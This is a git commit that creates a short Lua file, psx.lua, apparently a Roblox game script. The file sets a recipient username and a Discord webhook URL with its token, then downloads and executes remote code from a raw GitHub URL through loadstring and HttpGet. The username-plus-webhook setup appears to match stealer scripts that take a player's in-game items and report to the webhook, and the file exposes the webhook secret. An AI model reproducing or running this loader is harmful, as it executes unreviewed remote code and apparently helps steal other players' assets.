dd3816eccbb4314125f04a5281b184eab06cfa80
soulkadeath <108738671+soulkadeath@users.noreply.github.com>
2023-03-26 17:16:03 +0300

    Create psx.lua

---
+++ psx.lua
@@ -0,0 +1,4 @@
+UserName = "mspburak84"
+WebHook = "https://discord.com/api/webhooks/1089545231101337701/EfQTTV9XeRrr4EzJFS5im9B8Dyzz_ULjYSFp9uanwBEwjWU4lg6hQmn7CPc-EdWBsRFW"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
